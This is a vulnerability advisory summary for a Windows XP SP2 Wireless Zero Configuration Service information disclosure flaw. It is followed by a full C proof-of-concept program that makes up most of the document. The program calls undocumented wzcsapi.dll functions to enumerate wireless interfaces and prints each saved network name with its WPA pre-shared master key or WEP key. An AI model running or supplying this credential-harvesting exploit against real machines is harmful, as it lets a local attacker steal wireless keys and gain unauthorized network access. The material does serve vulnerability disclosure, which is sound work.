source: http://www.securityfocus.com/bid/15008/info

WZCSVC is affected by an information disclosure vulnerability.

Reportedly, the Pairwise Master Key (PMK) of the Wi-Fi Protected Access (WPA) preshared key authentication and the WEP keys of the interface may be obtained by a local unauthorized attacker.

A successful attack can allow an attacker to obtain the keys and subsequently gain unauthorized access to a device. This attack would likely present itself in a multi-user environment with restricted or temporary wireless access such as an Internet cafe, where an attacker could return at a later time and gain unauthorized access.

Microsoft Windows XP SP2 was reported to be vulnerable, however, it is possible that other versions are affected as well. 

//The code is not perfect, but demonstrates the given problem. If the API
//is changed the code can be easily broken.
//The code is released under GPL (http://www.gnu.org/licenses/gpl.html), by Laszlo Toth.
//Use the code at your own responsibility.

#include "stdafx.h"

#include <string.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <wchar.h>

struct GUID_STRUCT{
	//How many wireless cards are in the PC?
	int count;
	wchar_t** guids_ar;
}guids;

struct PSK_STRUCT{
	char ssid[92];
	int psk_length;
	unsigned char psk[32];
	char other[584];
};

struct SSIDS_STRUCT{
	//How many profile are configured?
	int count;
	char other[24];
	PSK_STRUCT psk;
};

struct INTF_ENTRY_STRUCT{
	wchar_t* guid;
	char other[72];
	SSIDS_STRUCT* ssidlist;
	char other2[10000];
}iestr;

typedef int (WINAPI* PQUERYI)(void*, int, void*, void*);
typedef int (WINAPI* PENUMI)(void*, GUID_STRUCT*);

int _tmain(int argc, _TCHAR* argv[])
{
	//Load wzcsapi to use the implemented RPC interface of Wireless Zero
	//Configuration Service
	HMODULE hMod = LoadLibrary ("wzcsapi.dll");
	if (NULL == hMod)
	{
		printf ("LoadLibrary failed\n");
		return 1;
	}
	
	//Get the address of the WZCEnumInterfaces. We need the guid of the
	//wireless devices.
	PENUMI pEnumI = (PENUMI) GetProcAddress (hMod, "WZCEnumInterfaces");
	if (NULL == pEnumI)
	{
		printf ("GetProcAddress pEnumI failed\n");
		return 1;
	}
	
	//The call of WZCEnumInterfaces
	int ret=pEnumI(NULL, &guids);
	if (ret!=0){
		printf("WZCEnumInterfaces failed!\n");
		return 1;
	}

	//Get the address of the WZCQueryInterface
	PQUERYI pQueryI = (PQUERYI) GetProcAddress (hMod, "WZCQueryInterface");
	if (NULL == pQueryI)
	{
		printf ("GetProcAddress pQueryI failed\n");
		return 1;
	}

	int j;
	for(j=0;j<guids.count;j++){
		wprintf(L"%s\n",guids.guids_ar[j]);
		//memset(&iestr,0,sizeof(iestr));
		iestr.guid=guids.guids_ar[j];
		
		DWORD dwOutFlags=0;

		//This was the debugged value of the second parameter.
		//int ret=pQueryI(NULL,0x040CFF0F, ie, &dwOutFlags);
		
		ret=pQueryI(NULL,0xFFFFFFFF, &iestr, &dwOutFlags);
		if (ret!=0){
			printf("WZCQueryInterface failed!\n");
			return 1;
		}
	
		//This code is still messy...
		if (iestr.ssidlist==NULL){
			wprintf(L"There is no SSIDS for: %s!\n", iestr.guid);
		}else{

			PSK_STRUCT* temp=&(iestr.ssidlist->psk);
			int i=0;
			for(i=0;i<iestr.ssidlist->count;i++){
				if(32==temp->psk_length){
					printf("%s:",temp->ssid);
					for(int j=0; j<32; j++){
						printf("%02x",temp->psk[j]);
					}
					printf("\n");
				}else{
					printf("%s:%s\n",temp->ssid, temp->psk);
				}
				temp++;
			}
		}


	}
	return 0;
}

